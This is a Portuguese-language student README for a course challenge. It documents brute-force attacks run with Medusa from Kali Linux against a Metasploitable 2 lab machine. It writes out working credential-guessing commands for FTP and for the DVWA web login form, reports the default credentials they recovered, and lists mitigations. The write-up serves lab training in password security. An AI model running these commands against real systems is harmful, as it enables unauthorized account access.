# 🛡️ Desafio de Projeto: Brute Force Attack com Medusa e Hydra (DIO)

Este projeto documenta a simulação e análise de vulnerabilidades de Força Bruta (Brute-Force) em ambientes controlados, utilizando as ferramentas Medusa e Hydra no Kali Linux.

**Aluno:** Murilo
**Ambiente:** VMware Workstation (Kali Linux + Metasploitable 2)

---

## 💻 Configuração e Ferramentas

| Ferramenta | Função | IP do Alvo |
| :--- | :--- | :--- |
| **Kali Linux** | Máquina de ataque (Host Only) | 192.168.124.X |
| **Metasploitable 2** | Alvo vulnerável (FTP, DVWA) | **192.168.124.130** |

---

## 💥 Cenários de Ataque e Lições Aprendidas

### 1. 💾 Ataque em Acesso de Arquivos (Protocolo FTP)

**Objetivo:** Obter credenciais válidas para o serviço FTP (Vsfptd 2.3.4).

**Comando Medusa Executado:**

\`\`\`bash
medusa -h 192.168.124.130 -U users.txt -P pass.txt -M ftp -t 6
\`\`\`

**Resultado Contundente:**
Ataque bem-sucedido. O Medusa encontrou o par **\`msfadmin:msfadmin\`**, o que foi validado com sucesso através do cliente FTP no terminal (\`230 Login successful\`).

### 2. 🌐 Ataque em Aplicação Web (HTTP POST / DVWA)

**Objetivo:** Automatizar o login na página do DVWA.

**Estratégia:** Foi necessário analisar a requisição HTTP POST para criar o payload correto. Utilizamos o **Hydra** na execução prática para superar os desafios de detecção do Medusa em ambientes com redirecionamento.

**Comando de Execução (Medusa/Hydra - Análise de Formulário):**

\`\`\`bash
medusa -h 192.168.124.130 -U users.txt -P pass.txt -M http \\
-m PAGE:/dvwa/login.php \\
-m FORM:'username=^USER^&password=^PASS^&Login=Login' \\
-m FAIL:'Login failed' -t 6
\`\`\`

**Resultado:**
O ataque foi bem-sucedido, identificando a credencial padrão de administrador: **\`admin:password\`**.

---

## 🛡️ Medidas de Mitigação e Defesa

1. **Rate Limiting:** Implementar bloqueio de IP após poucas tentativas de login falhas (3-5 tentativas), especialmente em serviços de rede como FTP e portas Web.
2. **Autenticação Segura:** Migrar de FTP para **SFTP/FTPS** (criptografado) e implementar **MFA** (Multi-Factor Authentication) em aplicações web.
3. **Política de Senhas:** Exigir senhas complexas e longas. A credencial padrão ter sido encontrada mostra a falha em remover/alterar credenciais *default*.

---

## 🖼️ Evidências e Submissão

Todas as capturas de tela (execução do Medusa, login FTP, etc.) estão organizadas na pasta `/images`.
